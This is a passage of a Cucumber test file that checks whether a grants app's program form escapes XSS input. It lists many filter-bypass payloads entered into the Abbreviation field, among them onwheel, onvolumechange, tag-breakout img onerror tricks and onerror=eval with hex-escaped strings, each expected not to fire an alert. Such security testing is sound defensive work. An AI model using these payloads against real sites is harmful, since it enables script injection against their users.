      | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300875 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | <body onwheel=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300877 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                 | Field                |
      | <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300878 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300879 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <style><img title="</style><img src onerror=alert(1)>"></style> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300881 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <script><img title="</script><img src onerror=alert(1)>"></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300882 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300884 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xmp><img title="</xmp><img src onerror=alert(1)>"></xmp> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300888 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300890 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300894 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <title><img title="</title><img src onerror=alert(1)>"></title> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300895 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                            | Field                |
      | <input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300896 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>onerror=alert;throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300897 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <script>{onerror=alert}throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300899 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>throw onerror=alert,1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300900 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script>throw onerror=eval,'=alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300904 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <script>throw onerror=eval,'alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300906 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300911 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
